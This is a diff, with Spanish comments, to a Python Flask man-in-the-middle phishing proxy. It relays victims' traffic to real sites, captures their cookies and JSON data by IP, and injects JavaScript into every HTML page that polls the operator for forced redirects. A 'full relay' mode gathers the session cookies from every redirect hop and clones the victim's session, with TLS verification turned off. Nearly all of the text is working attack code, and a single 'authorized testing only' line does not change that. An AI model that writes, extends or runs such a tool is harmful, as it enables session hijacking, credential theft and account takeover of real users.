@@ -84,29 +84,24 @@ class MITMProxy:
         # Flask
         self.app = Flask(__name__)
         import logging; logging.getLogger('werkzeug').setLevel(logging.ERROR)
-        
-        self.redirect_event = threading.Event()
-        self.redirect_data = {}
 
         @self.app.route('/__ml__', methods=['POST'])
         def _ml():
             self._js_capture()
             return '', 204
 
-        @self.app.route('/__redir__')
-        def _redir():
-            """SSE endpoint para push instantáneo de redirects"""
-            def gen():
-                while True:
-                    self.redirect_event.wait()
-                    ip = freq.remote_addr
-                    with self.redirect_lock:
-                        if ip in self.redirect_data:
-                            target = self.redirect_data.pop(ip)
-                            yield f"data: {target}\n\n"
-                            break
-                    time.sleep(0.1)
-            return Response(gen(), mimetype='text/event-stream')
+        @self.app.route('/__check_redirect__', methods=['GET'])
+        def _check_redirect():
+            """Endpoint simple para que JS verifique si hay redirect"""
+            ip = freq.remote_addr
+            target = self._get_redirect_target(ip)
+            if target:
+                # Asegurar protocolo
+                if not target.startswith(('http://', 'https://')):
+                    target = 'http://' + target
+                print(f"  {CY}[→] Redirect detectado: {ip} → {target}{RST}")
+                return Response(target, mimetype='text/plain')
+            return Response('', status=204)
 
         @self.app.route('/', defaults={'path':''}, methods=['GET','POST','PUT','DELETE','PATCH','OPTIONS','HEAD'])
         @self.app.route('/<path:path>', methods=['GET','POST','PUT','DELETE','PATCH','OPTIONS','HEAD'])
@@ -135,44 +130,13 @@ class MITMProxy:
         return self.sessions[ip]
 
     # ===========================================================
-    #  PROXY HANDLER
+    #  PROXY HANDLER - REESCRITO DESDE CERO
     # ===========================================================
     def _handle(self, path):
         self.reqs += 1
         ip = freq.remote_addr
         sess = self._sess(ip)
         method = freq.method
-
-        # Verificar redirecciones INSTANTANEAS - NO devolver redirect, notificar vía SSE
-        with self.redirect_lock:
-            target = None
-            # one_redirect: solo redirige una vez por IP
-            if ip in self.one_redirects:
-                tgt, used = self.one_redirects[ip]
-                if not used:
-                    self.one_redirects[ip] = (tgt, True)
-                    target = tgt
-                else:
-                    del self.one_redirects[ip]
-            
-            # redirect per-ip o global
-            if not target:
-                if ip in self.redirects:
-                    target = self.redirects[ip]
-                elif 'global' in self.redirects:
-                    target = self.redirects['global']
-            
-            # next_redirect: solo aplica a la proxima peticion
-            if not target and 'next' in self.redirects:
-                target = self.redirects['next']
-                del self.redirects['next']
-            
-            if target:
-                # Notificar al cliente via SSE en vez de devolver 302
-                self.redirect_data[ip] = target
-                self.redirect_event.set()
-                # Resetear evento para próxima vez
-                threading.Timer(0.1, lambda: self.redirect_event.clear()).start()
 
         # URL destino
         tpath = f"/{path}"
@@ -202,31 +166,43 @@ class MITMProxy:
         for cn, cv in freq.cookies.items():
             sess.cookies.set(cn, cv)
 
-        # ===== REQUEST AL SERVIDOR REAL =====
-        try:
-            resp = self._do_request(sess, method, url, hdrs, body)
-        except Exception as e:
-            print(f"  {R}[!] Error: {url}: {e}{RST}")
-            return Response(f"<h1>502</h1><p>{e}</p>", status=502)
+        # ===== MODO --fr: FULL RELAY =====
+        if self.follow_redirects:
+            final_resp = self._full_relay(sess, method, url, hdrs, body, ip)
+        else:
+            # MODO NORMAL: request directo sin seguir redirects
+            try:
+                final_resp = sess.request(
+                    method=method, url=url, headers=hdrs,
+                    data=body if method in ('POST','PUT','PATCH') else None,
+                    allow_redirects=False, timeout=25, verify=False, stream=False
+                )
+            except Exception as e:
+                print(f"  {R}[!] Error: {e}{RST}")
+                return Response(f"<h1>502</h1><p>{e}</p>", status=502)
 
         # Capturar cookies
         self._sniff_cookies(ip, sess, url)
 
-        # Respuesta
-        resp_body = resp.content
-        resp_ct = resp.headers.get('Content-Type','')
+        # Preparar respuesta
+        resp_body = final_resp.content
+        resp_ct = final_resp.headers.get('Content-Type','')
+        status = final_resp.status_code
 
+        # Rewrite body
         if 'text/html' in resp_ct or 'xhtml' in resp_ct:
-            resp_body = self._rw_html(resp_body, resp.encoding)
+            resp_body = self._rw_html(resp_body, final_resp.encoding)
         elif any(x in resp_ct for x in ['javascript','text/css','text/xml']):
-            resp_body = self._rw_text(resp_body, resp.encoding)
+            resp_body = self._rw_text(resp_body, final_resp.encoding)
         elif 'json' in resp_ct:
             self._sniff_json(ip, resp_body, url)
-            resp_body = self._rw_text(resp_body, resp.encoding)
+            resp_body = self._rw_text(resp_body, final_resp.encoding)
 
         # Flask response
-        fr = make_response(resp_body, resp.status_code)
-        for k, v in resp.headers.items():
+        fr = make_response(resp_body, status)
+        
+        # Copiar headers
+        for k, v in final_resp.headers.items():
             kl = k.lower()
             if kl in STRIP_RESP: continue
             if kl == 'location': v = self._to_proxy(v)
@@ -235,114 +211,207 @@ class MITMProxy:
 
         # Set-Cookie al navegador
         raw_sc = []
-        
-        # MODO --fr: usar cookies acumuladas de todos los redirects
-        if self.follow_redirects and hasattr(resp, '_mitm_cookies'):
-            raw_sc = resp._mitm_cookies
+        if hasattr(final_resp, '_all_cookies'):
+            # Cookies acumuladas en modo --fr
+            raw_sc = final_resp._all_cookies
             if raw_sc:
                 print(f"  {M}[FR] Clonando {len(raw_sc)} cookies al navegador{RST}")
         else:
-            # MODO NORMAL: solo cookies de la respuesta final
-            if hasattr(resp.raw, 'headers') and hasattr(resp.raw.headers, 'getlist'):
-                raw_sc = resp.raw.headers.getlist('Set-Cookie')
+            # Cookies de respuesta normal
+            if hasattr(final_resp.raw, 'headers') and hasattr(final_resp.raw.headers, 'getlist'):
+                raw_sc = final_resp.raw.headers.getlist('Set-Cookie')
             if not raw_sc:
-                sc = resp.headers.get('Set-Cookie')
+                sc = final_resp.headers.get('Set-Cookie')
                 if sc: raw_sc = [sc]
         
         for sc in raw_sc:
             fr.headers.add('Set-Cookie', self._fix_ck(sc))
 
+        # INYECTAR POLLING JS EN TODAS LAS PÁGINAS HTML
+        if 'text/html' in resp_ct:
+            # JS que hace polling para verificar redirects
+            polling_js = '''<script type="text/javascript">
+(function(){
+    var checkInterval = setInterval(function(){
+        fetch("/__check_redirect__", {method: "GET", cache: "no-cache"})
+        .then(function(r){
+            if(r.status === 200) {
+                return r.text();
+            }
+            return null;
+        })
+        .then(function(target){
+            if(target && target.length > 0) {
+                console.log("[REDIRECT] Redirigiendo a:", target);
+                clearInterval(checkInterval);
+                window.location.replace(target);
+            }
+        })
+        .catch(function(e){
+            console.error("[REDIRECT] Error:", e);
+        });
+    }, 500);
+})();
+</script>'''
+            # Inyectar al principio del HTML
+            body_str = resp_body if isinstance(resp_body, str) else resp_body.decode('utf-8', errors='replace')
+            
+            if '<head>' in body_str:
+                body_str = body_str.replace('<head>', '<head>' + polling_js, 1)
+            elif '<head' in body_str:
+                body_str = re.sub(r'<head([^>]*)>', r'<head\1>' + polling_js, body_str, count=1)
+            elif '<html>' in body_str:
+                body_str = body_str.replace('<html>', '<html>' + polling_js, 1)
+            elif '<html' in body_str:
+                body_str = re.sub(r'<html([^>]*)>', r'<html\1>' + polling_js, body_str, count=1)
+            else:
+                body_str = polling_js + body_str
+            
+            resp_body = body_str.encode('utf-8') if isinstance(resp_body, bytes) else body_str
+            fr.set_data(resp_body)
+
         # Log
         mc = G if method == 'GET' else Y
-        sc_c = G if resp.status_code < 300 else (CY if resp.status_code < 400 else R)
-        print(f"  {mc}{method:6}{RST} {sc_c}{resp.status_code}{RST} {tpath[:70]}")
+        sc_c = G if status < 300 else (CY if status < 400 else R)
+        print(f"  {mc}{method:6}{RST} {sc_c}{status}{RST} {tpath[:70]}")
 
         return fr
 
     # ===========================================================
-    #  REQUEST CON REDIRECT MANUAL (CODIGO ORIGINAL)
+    #  GET REDIRECT TARGET
     # ===========================================================
-    def _do_request(self, sess, method, url, hdrs, body):
-        visited = set()
-        max_hops = 15
+    def _get_redirect_target(self, ip):
+        """Obtiene el target de redirect si está configurado"""
+        with self.redirect_lock:
+            # One-time redirect (se elimina después de usar)
+            if ip in self.one_redirects:
+                target, used = self.one_redirects[ip]
+                if not used:
+                    self.one_redirects[ip] = (target, True)
+                    return target
+                else:
+                    del self.one_redirects[ip]
+            
+            # Next redirect (se elimina después de usar)
+            if 'next' in self.redirects:
+                target = self.redirects['next']
+                del self.redirects['next']
+                return target
+            
+            # Per-IP redirect (PERMANENTE hasta que se limpie)
+            if ip in self.redirects:
+                return self.redirects[ip]
+            
+            # Global redirect (PERMANENTE hasta que se limpie)
+            if 'global' in self.redirects:
+                return self.redirects['global']
+        
+        return None
+
+    # ===========================================================
+    #  FULL RELAY (MODO --fr)
+    # ===========================================================
+    def _full_relay(self, sess, method, url, hdrs, body, ip):
+        """
+        MODO --fr: Suplanta la sesión completamente.
+        """
+        print(f"  {M}[FR] Full Relay activado{RST}")
+        
+        all_cookies = []
         current_url = url
         current_method = method
         current_body = body
         current_hdrs = dict(hdrs)
-        all_cookies = []  # Solo para modo --fr
-
+        visited = set()
+        max_hops = 20
+        
         for hop in range(max_hops):
-            # Detectar loop
             key = f"{current_method}:{current_url}"
             if key in visited:
-                print(f"  {Y}[loop] Redirect loop detectado, sirviendo ultima respuesta{RST}")
-                return sess.request(
-                    method='GET', url=current_url, headers=self._clean_hdrs(current_hdrs),
-                    allow_redirects=False, timeout=25, verify=False, stream=False
-                )
+                print(f"  {Y}[FR] Loop detectado{RST}")
+                break
             visited.add(key)
-
+            
             # Request
-            resp = sess.request(
-                method=current_method,
-                url=current_url,
-                headers=self._clean_hdrs(current_hdrs),
-                data=current_body if current_method in ('POST','PUT','PATCH') else None,
-                allow_redirects=False,
-                timeout=25,
-                verify=False,
-                stream=False
-            )
-
-            # MODO --fr: capturar cookies de cada hop
-            if self.follow_redirects:
-                if hasattr(resp.raw, 'headers') and hasattr(resp.raw.headers, 'getlist'):
-                    cookies_in_hop = resp.raw.headers.getlist('Set-Cookie')
-                    all_cookies.extend(cookies_in_hop)
-
-            # No es redirect? Listo
+            try:
+                resp = sess.request(
+                    method=current_method,
+                    url=current_url,
+                    headers=current_hdrs,
+                    data=current_body if current_method in ('POST','PUT','PATCH') else None,
+                    allow_redirects=False,
+                    timeout=25,
+                    verify=False,
+                    stream=False
+                )
+            except Exception as e:
+                print(f"  {R}[FR] Error: {e}{RST}")
+                if hop > 0 and all_cookies:
+                    resp._all_cookies = all_cookies
+                    return resp
+                raise
+            
+            # Capturar y aplicar cookies INMEDIATAMENTE
+            hop_cookies = []
+            if hasattr(resp.raw, 'headers') and hasattr(resp.raw.headers, 'getlist'):
+                hop_cookies = resp.raw.headers.getlist('Set-Cookie')
+            
+            if hop_cookies:
+                all_cookies.extend(hop_cookies)
+                # IMPORTANTE: Aplicar cookies a la sesión AHORA
+                for cookie_str in hop_cookies:
+                    try:
+                        # Parsear la cookie
+                        cookie_line = cookie_str.split(';')[0].strip()
+                        if '=' in cookie_line:
+                            name, value = cookie_line.split('=', 1)
+                            sess.cookies.set(name.strip(), value.strip())
+                            print(f"  {G}[FR] Cookie aplicada: {name.strip()}={value.strip()[:20]}...{RST}")
+                    except Exception as e:
+                        print(f"  {Y}[FR] Error parseando cookie: {e}{RST}")
+                
+                print(f"  {G}[FR] Hop {hop+1}: {resp.status_code} | {len(hop_cookies)} cookies aplicadas{RST}")
+            else:
+                print(f"  {DIM}[FR] Hop {hop+1}: {resp.status_code} | 0 cookies{RST}")
+            
+            # Si NO es redirect, terminamos
             if resp.status_code not in (301, 302, 303, 307, 308):
-                if self.follow_redirects and all_cookies:
-                    resp._mitm_cookies = all_cookies
+                print(f"  {G}[FR] ✓ Respuesta final: {resp.status_code} {urlparse(current_url).path}{RST}")
+                resp._all_cookies = all_cookies
                 return resp
-
-            # Es redirect - obtener Location
+            
+            # Es redirect
             location = resp.headers.get('Location', '')
             if not location:
-                if self.follow_redirects and all_cookies:
-                    resp._mitm_cookies = all_cookies
+                resp._all_cookies = all_cookies
                 return resp
-
+            
             # Hacer absoluta
             if not location.startswith('http'):
                 location = urljoin(current_url, location)
-
-            # Log redirect
-            short_loc = urlparse(location).path[:50]
-            print(f"  {DIM}  -> {resp.status_code} -> {short_loc}{RST}")
-
+            
+            print(f"  {DIM}  └→ {resp.status_code} → {urlparse(location).path}{RST}")
+            
             # Siguiente hop
             if resp.status_code in (301, 302, 303):
                 current_method = 'GET'
                 current_body = None
-            # 307/308 mantienen metodo
-
-            # Actualizar host si cambio de dominio
-            new_parsed = urlparse(location)
-            current_hdrs['Host'] = new_parsed.netloc
+            
+            # Actualizar headers para siguiente request
+            parsed = urlparse(location)
+            current_hdrs = {
+                'Host': parsed.netloc,
+                'User-Agent': sess.headers.get('User-Agent', ''),
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'identity',
+                'Referer': current_url,
+            }
             current_url = location
-
-        # Excedio max_hops
-        print(f"  {Y}[!] Max redirects ({max_hops}) alcanzados{RST}")
-        if self.follow_redirects and all_cookies:
-            resp._mitm_cookies = all_cookies
+        
+        print(f"  {Y}[FR] Max hops alcanzados{RST}")
+        resp._all_cookies = all_cookies
         return resp
-
-    def _clean_hdrs(self, hdrs):
-        """Copia headers limpiando Accept-Encoding"""
-        h = dict(hdrs)
-        h['Accept-Encoding'] = 'identity'
-        return h
 
     # ===========================================================
     #  REWRITE (CODIGO ORIGINAL)
@@ -908,7 +977,7 @@ def main():
   {CY}Modo Normal vs --fr:{RST}
     {W}Normal:{RST} Sigue redirects pero solo envia cookies de respuesta final
     {W}--fr:{RST}   Sigue redirects y acumula TODAS las cookies de cada hop
-            Clona sesion completa al navegador
+            Clona sesion completa al navegador (fix login issues)
 
   {R}Solo para pruebas autorizadas.{RST}
 {M}{'='*70}{RST}
